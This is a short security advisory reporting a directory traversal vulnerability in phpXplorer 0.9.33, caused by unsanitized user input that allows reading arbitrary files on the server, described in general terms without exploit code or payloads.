phpXplorer is prone to a directory traversal vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to retrieve arbitrary files from the vulnerable system in the context of the Web server process. Information obtained may aid in further attacks; other attacks are also possible.

Version 0.9.33 is vulnerable; other versions may also be affected.
